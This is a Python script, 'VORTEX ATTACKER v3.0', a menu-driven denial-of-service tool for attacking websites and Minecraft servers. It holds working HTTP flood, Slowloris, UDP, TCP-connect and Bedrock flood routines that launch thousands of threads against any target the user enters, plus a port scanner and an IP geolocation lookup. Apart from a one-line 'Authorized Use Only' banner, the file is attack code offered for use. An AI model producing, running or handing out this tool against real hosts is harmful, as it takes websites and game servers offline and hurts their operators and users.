#!/usr/bin/env python3
# VORTEX ATTACKER v3.0 - Website + Minecraft DDoS Tool
# Features: Website Attack, Minecraft Attack, IP Lookup, Port Scanner, Save/Load Targets

import socket
import threading
import random
import sys
import time
import os
import json
from datetime import datetime

VERSION = "3.0"
AUTHOR = "Vortex"

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

def clear_screen():
    os.system('clear')

def banner():
    clear_screen()
    print(BOLD + CYAN + """
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║    ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗          ║
║    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝          ║
║    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝           ║
║    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗           ║
║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗          ║
║      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝          ║
║                                                                  ║
║         VORTEX ATTACKER v3.0 - Website + Minecraft              ║
║         Non-Root | Termux Native | Multi-Purpose                 ║
╚══════════════════════════════════════════════════════════════════╝
""" + RESET)
    print(YELLOW + "[!] Authorized Use Only - Test on your own servers" + RESET)
    print(BLUE + "[!] Press Ctrl+C to stop any attack\n" + RESET)

def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[+] {domain} resolved to {ip}" + RESET)
        return ip
    except:
        print(RED + f"[-] Cannot resolve {domain}" + RESET)
        return None

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

# ============ WEBSITE ATTACK METHODS ============

def http_flood(url, stop_event):
    import urllib.request
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    req = urllib.request.Request(url, headers=headers)
    while not stop_event.is_set():
        try:
            urllib.request.urlopen(req, timeout=5)
        except:
            pass

def slowloris(ip, port, stop_event):
    sockets = []
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            sockets.append(sock)
            if len(sockets) > 500:
                sockets.pop(0).close()
        except:
            pass

# ============ MINECRAFT ATTACK METHODS ============

def udp_flood(ip, port, stop_event):
    data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            sent += 1
            if sent % 5000 == 0:
                print(f"[UDP] Packets: {sent}", end="\r")
        except:
            pass

def tcp_flood(ip, port, stop_event):
    sent = 0
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            sock.send(b"\x00" * 32)
            sock.close()
            sent += 1
            if sent % 1000 == 0:
                print(f"[TCP] Connections: {sent}", end="\r")
        except:
            pass

def syn_flood(ip, port, stop_event):
    sent = 0
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            sock.connect((ip, port))
            sent += 1
            if sent % 1000 == 0:
                print(f"[SYN] Handshakes: {sent}", end="\r")
        except:
            pass

def bedrock_flood(ip, port, stop_event):
    packet = b'\x01\x00\x00\x00' + b'\x00' * 32
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while not stop_event.is_set():
        try:
            sock.sendto(packet, (ip, port))
            sent += 1
            if sent % 5000 == 0:
                print(f"[BEDROCK] Packets: {sent}", end="\r")
        except:
            pass

# ============ IP LOOKUP FEATURE ============

def ip_lookup():
    clear_screen()
    banner()
    print(PURPLE + "\n[ IP LOOKUP - Get Information about IP Address ]" + RESET)
    target = input(YELLOW + "Enter IP or Domain: " + RESET)
    
    if not target.replace('.', '').isdigit():
        ip = resolve_domain(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    print(CYAN + f"\n[ LOOKING UP {ip} ]" + RESET)
    
    # Get IP info using free API
    try:
        import urllib.request
        import json
        url = f"http://ip-api.com/json/{ip}"
        response = urllib.request.urlopen(url)
        data = json.loads(response.read())
        
        if data['status'] == 'success':
            print(GREEN + f"\nCountry: {data['country']}" + RESET)
            print(f"Region: {data['regionName']}")
            print(f"City: {data['city']}")
            print(f"ISP: {data['isp']}")
            print(f"Organization: {data['org']}")
            print(f"Timezone: {data['timezone']}")
            print(f"Coordinates: {data['lat']}, {data['lon']}")
            print(f"Map: https://www.google.com/maps?q={data['lat']},{data['lon']}")
        else:
            print(RED + "[-] Cannot get IP information" + RESET)
    except:
        print(RED + "[-] API request failed" + RESET)
    
    input("\nPress Enter...")

# ============ PORT SCANNER FEATURE ============

def port_scanner():
    clear_screen()
    banner()
    print(PURPLE + "\n[ PORT SCANNER - Find Open Ports on Target ]" + RESET)
    target = input(YELLOW + "Enter IP or Domain: " + RESET)
    
    if not target.replace('.', '').isdigit():
        ip = resolve_domain(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    ports = [21,22,23,25,53,80,443,8080,25565,19132,3306,3389,5900]
    print(CYAN + f"\n[ SCANNING {ip} ]" + RESET)
    
    open_ports = []
    for port in ports:
        if check_port(ip, port):
            print(GREEN + f"Port {port}: OPEN" + RESET)
            open_ports.append(port)
        else:
            print(f"Port {port}: Closed")
    
    print(f"\n{len(open_ports)} open ports found")
    input("Press Enter...")

# ============ WEBSITE ATTACK MENU ============

def website_attack():
    clear_screen()
    banner()
    print(PURPLE + "\n[ WEBSITE DDoS ATTACK ]" + RESET)
    
    url = input(YELLOW + "Enter Website URL (example: https://example.com): " + RESET)
    
    # Extract domain for Slowloris
    domain = url.replace("https://", "").replace("http://", "").split("/")[0]
    
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[+] Domain resolved to {ip}" + RESET)
    except:
        print(RED + "[-] Cannot resolve domain" + RESET)
        input("Press Enter...")
        return
    
    print(BLUE + "\n[ ATTACK METHODS ]" + RESET)
    print("1. HTTP Flood (Layer 7 - Website)")
    print("2. Slowloris (Keep connections open)")
    print("3. Both methods together")
    
    method = input("Select (1-3): ")
    threads = int(input(YELLOW + "Threads (1000-20000): " + RESET) or 5000)
    duration = int(input(YELLOW + "Duration (seconds): " + RESET) or 60)
    
    print(RED + f"\nTarget: {url}")
    print(f"Method: {method}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s" + RESET)
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    
    if method == "1" or method == "3":
        for _ in range(threads):
            t = threading.Thread(target=http_flood, args=(url, stop_event))
            t.daemon = True
            t.start()
    
    if method == "2" or method == "3":
        for _ in range(threads):
            t = threading.Thread(target=slowloris, args=(ip, 80, stop_event))
            t.daemon = True
            t.start()
    
    print(GREEN + f"\n[!] WEBSITE ATTACK STARTED on {url}" + RESET)
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(YELLOW + "\n[!] Stopping..." + RESET)
    finally:
        stop_event.set()
        print(GREEN + f"\n[!] Attack finished" + RESET)
        input("Press Enter...")

# ============ MINECRAFT ATTACK MENU ============

def minecraft_attack():
    clear_screen()
    banner()
    print(PURPLE + "\n[ MINECRAFT SERVER ATTACK ]" + RESET)
    
    target = input(YELLOW + "Enter IP or Domain: " + RESET)
    
    if not target.replace('.', '').isdigit():
        ip = resolve_domain(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    print(BLUE + "\n[ PORT SELECTION ]" + RESET)
    print("1. Minecraft Java (25565)")
    print("2. Minecraft Bedrock (19132)")
    print("3. Custom Port")
    port_choice = input("Select (1-3): ")
    
    if port_choice == "1":
        port = 25565
    elif port_choice == "2":
        port = 19132
    else:
        port = int(input("Enter port: "))
    
    if check_port(ip, port):
        print(GREEN + f"[+] Server {ip}:{port} is ONLINE" + RESET)
    else:
        print(RED + f"[-] Server {ip}:{port} is OFFLINE" + RESET)
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    print(BLUE + "\n[ ATTACK METHODS ]" + RESET)
    print("1. TCP Flood (Best for Java)")
    print("2. UDP Flood (Best for Bedrock)")
    print("3. SYN Flood (Router heavy)")
    print("4. Bedrock Flood (PE specific)")
    
    method_choice = input("Select (1-4): ")
    methods = {"1": tcp_flood, "2": udp_flood, "3": syn_flood, "4": bedrock_flood}
    attack_func = methods.get(method_choice, tcp_flood)
    method_names = {"1":"TCP","2":"UDP","3":"SYN","4":"BEDROCK"}
    method_name = method_names.get(method_choice,"TCP")
    
    threads = int(input(YELLOW + f"Threads (1000-30000, default 10000): " + RESET) or 10000)
    duration = int(input(YELLOW + f"Duration in seconds (default 60): " + RESET) or 60)
    
    print(RED + f"\nTarget: {ip}:{port}")
    print(f"Method: {method_name}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s" + RESET)
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    
    for _ in range(threads):
        t = threading.Thread(target=attack_func, args=(ip, port, stop_event))
        t.daemon = True
        t.start()
    
    print(GREEN + f"\n[!] MINECRAFT ATTACK STARTED on {ip}:{port}" + RESET)
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(YELLOW + "\n[!] Stopping..." + RESET)
    finally:
        stop_event.set()
        print(GREEN + f"\n[!] Attack finished" + RESET)
        input("Press Enter...")

# ============ MAIN MENU ============

def main_menu():
    while True:
        banner()
        print(PURPLE + "╔════════════════════════════════════════════════════════╗")
        print("║                     MAIN MENU                            ║")
        print("╠════════════════════════════════════════════════════════╣")
        print("║  1. MINECRAFT Server DDoS Attack                       ║")
        print("║  2. WEBSITE DDoS Attack (HTTP/Slowloris)               ║")
        print("║  3. IP Lookup (Geolocation + ISP)                      ║")
        print("║  4. Port Scanner (Find open ports)                     ║")
        print("║  5. Resolve Domain to IP                               ║")
        print("║  6. Exit                                               ║")
        print("╚════════════════════════════════════════════════════════╝" + RESET)
        
        choice = input(YELLOW + "\nSelect (1-6): " + RESET)
        
        if choice == "1":
            minecraft_attack()
        elif choice == "2":
            website_attack()
        elif choice == "3":
            ip_lookup()
        elif choice == "4":
            port_scanner()
        elif choice == "5":
            domain = input("Enter domain: ")
            resolve_domain(domain)
            input("Press Enter...")
        elif choice == "6":
            print(RED + "Exiting Vortex Attacker..." + RESET)
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(RED + "\nExiting..." + RESET)
        sys.exit(0)
